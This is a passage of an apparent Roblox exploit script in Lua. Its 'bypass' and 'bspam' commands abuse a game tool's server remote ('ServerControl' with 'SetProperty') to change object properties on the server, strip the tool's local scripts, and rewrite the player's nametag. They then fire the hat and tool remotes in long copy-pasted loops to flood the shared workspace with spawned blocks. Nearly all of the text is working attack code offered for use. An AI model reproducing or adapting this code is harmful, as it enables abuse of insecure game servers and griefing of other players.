			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
		end
	elseif MainUserP.Character:FindFirstChild("PompousTheCloud") then
		
		wait()
		BreakAnimation()
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = false})
		end
	end
end

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
VerifyCloud()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","jepp.#2766")
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Size",UDim2.new(4.5, 10, 2, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Font","Antique")

CE:FireEvent("PompousTheCloud",MainUserW.Head.NametagTemplate,"StudsOffset",Vector3.new(-2.5,3.3,0))
   
    while true do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,0/255,0/255))
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,i/255,0/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(i/255,255/255,0/255))
    end
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0/255,255/255,i/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0/255,i/255,255/255))
    end
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(i/255,0/255,255/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,0/255,i/255))
    end
end
	end
				
	
	if cmd == "bypass" then
			 for i,v in pairs (game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end

local tool = game.Players.LocalPlayer.Character:WaitForChild("PompousTheCloud")
	tool.ServerControl:InvokeServer("SetProperty",{["Value"]="",["Property"]="MeshId",["Object"]=tool.Handle.Mesh})

for i,tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
if tool.Name == "PompousTheCloud" then 
	for i,localsript in pairs(tool:GetChildren()) do
		if localsript:IsA("LocalScript") then
localsript:Destroy()
		end
end
end
end    
wait(.2)
  for i,v in pairs (game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end

local MainUserP, MainUserW = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
function FireEvent(a,c,b,d)game.Players.LocalPlayer.Character:FindFirstChild(a)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=d,["Property"]=b,["Object"]=c})end
FireEvent("PompousTheCloud",MainUserW.Head.NametagTemplate.TagText,"Font","Pacifico")
FireEvent("PompousTheCloud",MainUserW.Head.NametagTemplate.TagText,"Size",Vector3.new(3,3,3))
game:GetService("RunService").RenderStepped:connect(function()
 local M = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text
    FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text",M)
end)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0, 0, 0))
--FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromHSV(0,0,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Active",true)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"StudsOffset",Vector3.new(0,5,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"ClipsDescendants",false)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(4, 0, 4, 0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"AlwaysOnTop",true)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"ExtentsOffset",Vector3.new(0,3,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"ExtentsOffsetWorldSpace",Vector3.new(0,0,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"LightInfluence","1")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"SizeOffset",Vector2.new(0,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"SizeOffsetWorldSpace",Vector3.new(0,0,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Active",false)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"LineHeight","1")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"BackgroundTransparency","1")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"AnchorPoint",Vector2.new(0,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextWrapped",true)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextScaled",true)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize","20")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextTransparency","0")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextTruncate","None")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeTransparency","0")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Zindex","69")
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Visible",true)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"ClipDescendants",false)
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Size",UDim2.new(7, 0, 1, 0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim2.new(-1.5,0,0.5,0))
FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Antique")
   
pcall(function()
    spawn(function()
        while true do
            for i = 0, 50 do
                FireEvent("PompousTheCloud", MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3", Color3.fromHSV(i/50, 1, 1))
                wait()
            end
        end
    end)
end)
		
			if cmd == "bspam" then
			    local UserName  = game:GetService('Players').LocalPlayer.Name
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

    if MainUserP["Backpack"]:FindFirstChild("PompousTheCloud") then
    MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent=MainUserW
    end
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()



game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()



game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()



game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()



game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
